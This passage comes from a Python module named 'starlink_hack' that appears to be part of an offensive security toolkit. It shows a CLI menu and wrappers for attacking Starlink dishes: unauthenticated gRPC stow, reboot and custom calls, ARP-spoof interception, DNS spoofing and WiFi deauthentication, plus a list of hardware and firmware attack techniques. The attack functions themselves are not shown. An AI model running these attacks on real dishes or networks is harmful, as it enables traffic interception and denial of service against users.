        self._log_result('rf', 'detect_jamming', result)
        return result

    # ── Known Vulnerabilities ───────────────────────────────────────────────

    def check_known_cves(self) -> Dict[str, Any]:
        """Check against known Starlink CVEs and return the full database."""
        result: Dict[str, Any] = {
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'cves': STARLINK_CVES,
            'total': len(STARLINK_CVES),
            'ok': True,
        }

        # Cross-reference with dish info if available
        sw_ver = self._dish_info_cache.get('software_version') or self._dish_info_cache.get('firmware')
        if sw_ver:
            result['current_firmware'] = sw_ver
            result['applicable_cves'] = []
            matched = KNOWN_VULNERABLE_VERSIONS.get(sw_ver, [])
            for cve_id in matched:
                for cve in STARLINK_CVES:
                    if cve['cve'] == cve_id:
                        result['applicable_cves'].append(cve)
                        break
            result['applicable_count'] = len(result['applicable_cves'])

        return result

    def get_exploit_database(self) -> Dict[str, Any]:
        """Return comprehensive database of known Starlink vulnerabilities and exploit techniques."""
        return {
            'ok': True,
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'cves': STARLINK_CVES,
            'known_vulnerable_versions': KNOWN_VULNERABLE_VERSIONS,
            'grpc_methods': STARLINK_GRPC_METHODS,
            'attack_surface': {
                'network': [
                    'gRPC API (port 9200) - unauthenticated in older firmware',
                    'HTTP API (port 80) - status and configuration',
                    'WiFi (2.4/5 GHz) - WPA2/WPA3 attacks',
                    'ARP spoofing - MITM between dish and clients',
                    'DNS spoofing - redirect traffic on LAN',
                    'Firmware update MITM - intercept update channel',
                ],
                'hardware': [
                    'UART debug console - root shell access',
                    'JTAG/SWD - SoC debug and memory extraction',
                    'Voltage fault injection - bypass secure boot',
                    'Bus snooping - SPI/I2C/eMMC interception',
                    'Side-channel analysis - power, EM emanations',
                ],
                'rf': [
                    'Ku-band downlink interception (10.7-12.7 GHz)',
                    'Ka-band uplink analysis (14.0-14.5 GHz)',
                    'Signal jamming / denial of service',
                    'WiFi deauthentication attacks',
                ],
                'software': [
                    'Firmware extraction and reverse engineering',
                    'Custom firmware injection via fault injection',
                    'gRPC service enumeration and fuzzing',
                    'Authentication bypass on older firmware',
                ],
            },
            'research_references': [
                {
                    'title': 'Glitched on Earth by Humans',
                    'authors': 'Lennert Wouters (KU Leuven COSIC)',
                    'url': 'https://www.usenix.org/conference/usenixsecurity23/presentation/wouters',
                    'summary': 'Voltage fault injection on Starlink UT to bypass secure boot',
                },
                {
                    'title': 'Reverse engineering the Starlink user terminal',
                    'authors': 'Oleg Kutkov',
                    'url': 'https://olegkutkov.me/2023/12/20/reverse-engineering-starlink-user-terminal/',
                    'summary': 'Teardown and analysis of Starlink UT hardware and gRPC API',
                },
                {
                    'title': 'LEO Satellite Security: Challenges and Opportunities',
                    'authors': 'Various researchers',
                    'url': 'https://arxiv.org/abs/2304.09523',
                    'summary': 'Academic analysis of LEO satellite constellation security',
                },
            ],
        }

    # ── Utility ─────────────────────────────────────────────────────────────

    def get_status(self) -> Dict[str, Any]:
        """Overall module status and tool availability."""
        nmap = find_tool('nmap')
        grpcurl = find_tool('grpcurl')
        arpspoof = find_tool('arpspoof')
        tcpdump = find_tool('tcpdump')
        hackrf_sweep = find_tool('hackrf_sweep')
        binwalk_tool = find_tool('binwalk')

        try:
            import grpc as grpc_lib  # noqa: F401
            grpc_python = True
        except ImportError:
            grpc_python = False

        return {
            'module': 'starlink_hack',
            'version': VERSION,
            'category': CATEGORY,
            'dish_ip': self._dish_ip,
            'grpc_port': self._grpc_port,
            'tools': {
                'nmap': bool(nmap),
                'grpcurl': bool(grpcurl),
                'grpc_python': grpc_python,
                'arpspoof': bool(arpspoof),
                'tcpdump': bool(tcpdump),
                'hackrf_sweep': bool(hackrf_sweep),
                'binwalk': bool(binwalk_tool),
            },
            'data_dir': str(self._data_dir),
            'results_count': len(self._results_log),
            'cached_dish_status': bool(self._dish_status_cache),
            'cached_dish_info': bool(self._dish_info_cache),
            'intercept_running': self._intercept_running,
        }

    def export_results(self, path: str = None) -> Dict[str, Any]:
        """Export all findings to JSON."""
        if path is None:
            path = str(self._results_dir / f'starlink_export_{int(time.time())}.json')

        export_data = {
            'export_timestamp': datetime.now(timezone.utc).isoformat(),
            'module': 'starlink_hack',
            'version': VERSION,
            'dish_ip': self._dish_ip,
            'dish_status': self._dish_status_cache,
            'dish_info': self._dish_info_cache,
            'network_info': self._network_cache,
            'scan_results': self._scan_results,
            'results_log': self._results_log,
            'cve_database': STARLINK_CVES,
        }

        try:
            output_path = Path(path)
            output_path.parent.mkdir(parents=True, exist_ok=True)
            with open(output_path, 'w') as f:
                json.dump(export_data, f, indent=2, default=str)
            file_size = output_path.stat().st_size
            return {
                'ok': True,
                'path': str(output_path),
                'size': file_size,
                'size_human': self._human_size(file_size),
                'entries': len(self._results_log),
            }
        except Exception as e:
            return {'ok': False, 'error': f'Export failed: {e}'}


# ── Singleton ────────────────────────────────────────────────────────────────

_instance = None


def get_starlink_hack() -> StarlinkHack:
    global _instance
    if _instance is None:
        _instance = StarlinkHack()
    return _instance


# ── CLI Interface ────────────────────────────────────────────────────────────

def run():
    """CLI entry point for Starlink hack module."""
    import sys
    sys.path.insert(0, str(Path(__file__).parent.parent))
    from core.banner import Colors, clear_screen, display_banner

    sl = get_starlink_hack()

    while True:
        clear_screen()
        display_banner()
        print(f"\n{Colors.RED}{'=' * 60}{Colors.RESET}")
        print(f"{Colors.RED}  STARLINK TERMINAL SECURITY ANALYSIS{Colors.RESET}")
        print(f"{Colors.RED}{'=' * 60}{Colors.RESET}")
        print(f"\n  Target dish: {Colors.YELLOW}{sl._dish_ip}{Colors.RESET}")
        print(f"\n  {Colors.BOLD}Discovery & Enumeration{Colors.RESET}")
        print(f"  1) Discover dish on network")
        print(f"  2) Get dish status")
        print(f"  3) Get device info")
        print(f"  4) Get network info / WiFi clients")
        print(f"  5) Port scan dish")
        print(f"\n  {Colors.BOLD}gRPC Exploitation{Colors.RESET}")
        print(f"  6) Enumerate gRPC methods")
        print(f"  7) Custom gRPC call")
        print(f"  8) Stow dish")
        print(f"  9) Unstow dish")
        print(f"  10) Reboot dish")
        print(f"\n  {Colors.BOLD}Network Attacks{Colors.RESET}")
        print(f"  11) Intercept traffic (ARP spoof)")
        print(f"  12) DNS spoofing")
        print(f"  13) Deauth WiFi clients")
        print(f"\n  {Colors.BOLD}RF & Firmware{Colors.RESET}")
        print(f"  14) Check firmware version")
        print(f"  15) Analyze firmware file")
        print(f"  16) Find debug interfaces")
        print(f"  17) Detect signal jamming")
        print(f"  18) Known CVEs & exploits")
        print(f"\n  {Colors.BOLD}Utility{Colors.RESET}")
        print(f"  19) Export results")
        print(f"  20) Set target dish IP")
        print(f"  0) Back")

        choice = input(f"\n  {Colors.BOLD}Select> {Colors.RESET}").strip()

        if choice == '0':
            break

        elif choice == '1':
            ip = input(f"\n  Dish IP [{sl._dish_ip}]: ").strip() or None
            print(f"\n{Colors.CYAN}[*] Discovering Starlink dish...{Colors.RESET}")
            result = sl.discover_dish(ip)
            if result.get('found'):
                print(f"{Colors.GREEN}[+] Dish found at {result['target']}{Colors.RESET}")
                print(f"  gRPC: {'open' if result.get('grpc_available') else 'closed'}")
                print(f"  HTTP: {'open' if result.get('http_available') else 'closed'}")
                if result.get('firmware'):
                    print(f"  Firmware: {result['firmware']}")
                if result.get('hardware'):
                    print(f"  Hardware: {result['hardware']}")
                extras = result.get('details', {}).get('extra_open_ports', [])
                if extras:
                    print(f"  Extra open ports: {extras}")
            else:
                print(f"{Colors.RED}[X] {result.get('error', 'Dish not found')}{Colors.RESET}")

        elif choice == '2':
            print(f"\n{Colors.CYAN}[*] Querying dish status...{Colors.RESET}")
            result = sl.get_dish_status()
            if result.get('ok'):
                print(f"{Colors.GREEN}[+] Dish Status:{Colors.RESET}")
                print(f"  State: {result.get('device_state', 'unknown')}")
                print(f"  Uptime: {result.get('uptime_human', 'unknown')}")
                print(f"  Firmware: {result.get('software_version', 'unknown')}")
                print(f"  Alerts: {result.get('alert_count', 0)} active")
                for alert in result.get('alerts', []):
                    print(f"    - {alert}")
                obs = result.get('obstruction', {})
                print(f"  Obstruction: {obs.get('fraction_obstructed', 0)}%")
                print(f"  Downlink: {result.get('downlink_throughput_bps', 0)} bps")
                print(f"  Uplink: {result.get('uplink_throughput_bps', 0)} bps")
                print(f"  Latency: {result.get('pop_ping_latency_ms', 0)} ms")
                print(f"  ETH Speed: {result.get('eth_speed_mbps', 0)} Mbps")
            else:
                print(f"{Colors.RED}[X] {result.get('error', 'Failed')}{Colors.RESET}")

        elif choice == '3':
            print(f"\n{Colors.CYAN}[*] Querying device info...{Colors.RESET}")
            result = sl.get_dish_info()
            if result.get('ok'):
                print(f"{Colors.GREEN}[+] Device Info:{Colors.RESET}")
                print(f"  Device ID: {result.get('device_id', 'unknown')}")
                print(f"  Hardware: {result.get('hardware_version', 'unknown')}")
                print(f"  Software: {result.get('software_version', 'unknown')}")
                print(f"  Country: {result.get('country_code', 'unknown')}")
                print(f"  Boot count: {result.get('bootcount', 0)}")
                print(f"  Is dev: {result.get('is_dev', False)}")
            else:
                print(f"{Colors.RED}[X] {result.get('error', 'Failed')}{Colors.RESET}")

        elif choice == '4':
            print(f"\n{Colors.CYAN}[*] Querying network info...{Colors.RESET}")
            result = sl.get_network_info()
            wifi_cfg = result.get('wifi_config', {})
            print(f"{Colors.GREEN}[+] Network Info:{Colors.RESET}")
            print(f"  WiFi SSID: {wifi_cfg.get('ssid', 'unknown')}")
            print(f"  Security: {wifi_cfg.get('security', 'unknown')}")
            clients = result.get('wifi_clients', [])
            print(f"  Connected clients: {len(clients)}")
            for c in clients:
                sig = c.get('signal_strength', '?')
                print(f"    {c.get('name', 'unknown'):20s} | {c.get('mac', '?'):17s} | {c.get('ip', '?'):15s} | {sig} dBm")

        elif choice == '5':
            print(f"\n{Colors.CYAN}[*] Port scanning {sl._dish_ip}...{Colors.RESET}")
            result = sl.scan_dish_ports()
            if result.get('ok'):
                print(f"{Colors.GREEN}[+] {result.get('open_port_count', 0)} open ports ({result.get('scanner')}):{Colors.RESET}")
                for p in result.get('ports', []):
                    print(f"  {p['port']}/{p['protocol']}\t{p['state']}\t{p['service']}")
            else:
                print(f"{Colors.RED}[X] {result.get('error', 'Scan failed')}{Colors.RESET}")

        elif choice == '6':
            print(f"\n{Colors.CYAN}[*] Enumerating gRPC methods...{Colors.RESET}")
            result = sl.grpc_enumerate()
            if result.get('ok'):
                src = f" ({result['source']})" if result.get('source') else ''
                print(f"{Colors.GREEN}[+] {result.get('method_count', 0)} methods{src}:{Colors.RESET}")
                for m in result.get('methods', []):
                    if isinstance(m, dict):
                        name = m.get('method', m.get('name', '?'))
                        desc = m.get('description', m.get('desc', ''))
                        print(f"  {name}: {desc}")
                    else:
                        print(f"  {m}")
            else:
                print(f"{Colors.RED}[X] {result.get('error', 'Failed')}{Colors.RESET}")

        elif choice == '7':
            method = input("\n  gRPC method name: ").strip()
            params_str = input("  Parameters (JSON, or empty): ").strip()
            params = None
            if params_str:
                try:
                    params = json.loads(params_str)
                except json.JSONDecodeError:
                    print(f"{Colors.RED}[X] Invalid JSON{Colors.RESET}")
                    input(f"\n{Colors.DIM}Press Enter to continue...{Colors.RESET}")
                    continue
            print(f"\n{Colors.CYAN}[*] Calling {method}...{Colors.RESET}")
            result = sl.grpc_call(method, params)
            if result.get('ok'):
                print(f"{Colors.GREEN}[+] Response:{Colors.RESET}")
                print(json.dumps(result.get('response', {}), indent=2, default=str))
            else:
                print(f"{Colors.RED}[X] {result.get('error', 'Failed')}{Colors.RESET}")

        elif choice == '8':
            confirm = input(f"\n  {Colors.YELLOW}Stow dish (park antenna)? [y/N]: {Colors.RESET}").strip().lower()
            if confirm == 'y':
                print(f"\n{Colors.CYAN}[*] Sending stow command...{Colors.RESET}")
                result = sl.stow_dish()
                print(f"{Colors.GREEN if result.get('ok') else Colors.RED}[{'+'if result.get('ok')else'X'}] {result.get('message', result.get('error', ''))}{Colors.RESET}")

        elif choice == '9':
            print(f"\n{Colors.CYAN}[*] Sending unstow command...{Colors.RESET}")
            result = sl.unstow_dish()
            print(f"{Colors.GREEN if result.get('ok') else Colors.RED}[{'+'if result.get('ok')else'X'}] {result.get('message', result.get('error', ''))}{Colors.RESET}")

        elif choice == '10':
            confirm = input(f"\n  {Colors.YELLOW}Reboot dish? [y/N]: {Colors.RESET}").strip().lower()
            if confirm == 'y':
                print(f"\n{Colors.CYAN}[*] Sending reboot command...{Colors.RESET}")
                result = sl.reboot_dish()
                print(f"{Colors.GREEN if result.get('ok') else Colors.RED}[{'+'if result.get('ok')else'X'}] {result.get('message', result.get('error', ''))}{Colors.RESET}")

        elif choice == '11':
            gateway = input(f"\n  Gateway IP [192.168.1.1]: ").strip() or '192.168.1.1'
            iface = input("  Interface (or empty for auto): ").strip() or None
            print(f"\n{Colors.CYAN}[*] Starting traffic interception...{Colors.RESET}")
            result = sl.intercept_traffic(gateway, iface)
            if result.get('ok'):
                print(f"{Colors.GREEN}[+] Interception running (PID: {result.get('pid')}){Colors.RESET}")
                print(f"  Tool: {result.get('tool')}")
                if result.get('capture_file'):
                    print(f"  Capture: {result['capture_file']}")
            else:
                print(f"{Colors.RED}[X] {result.get('error', 'Failed')}{Colors.RESET}")

        elif choice == '12':
            domain = input("\n  Domain to spoof: ").strip()
            spoof_ip = input("  Redirect to IP: ").strip()
            if domain and spoof_ip:
                print(f"\n{Colors.CYAN}[*] Starting DNS spoofing...{Colors.RESET}")
                result = sl.dns_spoof(domain, spoof_ip)
                if result.get('ok'):
                    print(f"{Colors.GREEN}[+] DNS spoofing active: {domain} -> {spoof_ip}{Colors.RESET}")
                else:
                    print(f"{Colors.RED}[X] {result.get('error', 'Failed')}{Colors.RESET}")

        elif choice == '13':
            target = input("\n  Target MAC (or empty for broadcast): ").strip() or None
            iface = input("  Wireless interface (or empty for auto): ").strip() or None
            print(f"\n{Colors.CYAN}[*] Sending deauth packets...{Colors.RESET}")
            result = sl.deauth_clients(target, iface)
            if result.get('ok'):
                print(f"{Colors.GREEN}[+] Deauth sent to {result.get('target', 'broadcast')}{Colors.RESET}")
            else:
                print(f"{Colors.RED}[X] {result.get('error', 'Failed')}{Colors.RESET}")

        elif choice == '14':
            print(f"\n{Colors.CYAN}[*] Checking firmware version...{Colors.RESET}")
            result = sl.check_firmware_version()
            if result.get('ok'):
                print(f"{Colors.GREEN}[+] Firmware: {result.get('software_version', 'unknown')}{Colors.RESET}")
                print(f"  Hardware: {result.get('hardware_version', 'unknown')}")
                if result.get('vulnerable'):
                    print(f"  {Colors.RED}VULNERABLE - {len(result.get('vulnerabilities', []))} known CVE(s){Colors.RESET}")
                    for vuln in result.get('vulnerabilities', []):
                        print(f"    {vuln['cve']}: {vuln['title']} ({vuln['severity']})")
                else:
                    print(f"  {Colors.GREEN}No known vulnerabilities for this version{Colors.RESET}")
            else:
                print(f"{Colors.RED}[X] {result.get('error', 'Failed')}{Colors.RESET}")

        elif choice == '15':
            fw_path = input("\n  Firmware file path: ").strip()
            if fw_path and os.path.exists(fw_path):
                print(f"\n{Colors.CYAN}[*] Analyzing firmware...{Colors.RESET}")
                result = sl.analyze_firmware(fw_path)
                if result.get('ok'):
                    print(f"{Colors.GREEN}[+] Analysis complete:{Colors.RESET}")
                    finfo = result.get('file_info', {})
                    print(f"  File: {finfo.get('name', '?')} ({finfo.get('size_human', '?')})")
                    print(f"  Signatures: {result.get('signature_count', 0)}")
                    for sig in result.get('signatures', [])[:10]:
                        print(f"    0x{sig.get('offset', 0):08x}: {sig.get('description', '?')}")
                    ent = result.get('entropy_analysis', {})
                    print(f"  Avg entropy: {ent.get('average', '?')}")
                    print(f"  Encrypted: {ent.get('likely_encrypted', '?')}")
                    print(f"  Interesting strings: {result.get('interesting_strings_count', 0)}")
                else:
                    print(f"{Colors.RED}[X] {result.get('error', 'Failed')}{Colors.RESET}")
            else:
                print(f"{Colors.RED}[X] File not found{Colors.RESET}")

        elif choice == '16':
            print(f"\n{Colors.CYAN}[*] Scanning for debug interfaces...{Colors.RESET}")
            result = sl.find_debug_interfaces()
            if result.get('ok'):
                print(f"{Colors.GREEN}[+] Debug interface scan:{Colors.RESET}")
                ports = result.get('serial_ports', [])
                print(f"  Serial ports: {len(ports)}")
                for p in ports:
                    jtag_note = ' [POSSIBLE JTAG]' if p.get('possible_jtag') else ''
                    print(f"    {p['device']}: {p['description']}{jtag_note}")
                print(f"  JTAG adapter detected: {result.get('jtag_detected', False)}")
                print(f"  OpenOCD available: {result.get('openocd_available', False)}")
            else:
                print(f"{Colors.RED}[X] {result.get('error', 'Failed')}{Colors.RESET}")

        elif choice == '17':
            print(f"\n{Colors.CYAN}[*] Checking for signal jamming...{Colors.RESET}")
            result = sl.detect_jamming()
            if result.get('ok'):
                if result.get('jamming_detected'):
                    print(f"{Colors.RED}[!] JAMMING INDICATORS DETECTED (confidence: {result.get('confidence')}){Colors.RESET}")
                else:
                    print(f"{Colors.GREEN}[+] No jamming indicators (confidence: {result.get('confidence')}){Colors.RESET}")
                for ind in result.get('indicators', []):
                    sev_color = Colors.RED if ind['severity'] == 'high' else Colors.YELLOW
                    print(f"  {sev_color}[{ind['severity'].upper()}]{Colors.RESET} {ind['detail']}")
            else:
                print(f"{Colors.RED}[X] {result.get('error', 'Failed')}{Colors.RESET}")

        elif choice == '18':
            result = sl.check_known_cves()
            print(f"\n{Colors.GREEN}[+] Known Starlink CVEs ({result.get('total', 0)}):{Colors.RESET}\n")
            for cve in result.get('cves', []):
                sev_color = Colors.RED if cve['severity'] in ('Critical', 'High') else Colors.YELLOW
                print(f"  {sev_color}{cve['cve']}{Colors.RESET} - {cve['title']}")
                print(f"    Severity: {cve['severity']} (CVSS {cve['cvss']})")
                print(f"    Affected: {cve['affected']}")
                print(f"    Technique: {cve['technique']}")
                print()

        elif choice == '19':
            path = input(f"\n  Export path (or empty for default): ").strip() or None
            print(f"\n{Colors.CYAN}[*] Exporting results...{Colors.RESET}")
            result = sl.export_results(path)
            if result.get('ok'):
                print(f"{Colors.GREEN}[+] Exported to: {result.get('path')}{Colors.RESET}")
                print(f"  Size: {result.get('size_human', '?')}")
                print(f"  Entries: {result.get('entries', 0)}")
            else:
                print(f"{Colors.RED}[X] {result.get('error', 'Failed')}{Colors.RESET}")

        elif choice == '20':
            new_ip = input(f"\n  New dish IP [{sl._dish_ip}]: ").strip()
            if new_ip:
                sl._dish_ip = new_ip
                print(f"{Colors.GREEN}[+] Target set to {new_ip}{Colors.RESET}")

        input(f"\n{Colors.DIM}Press Enter to continue...{Colors.RESET}")
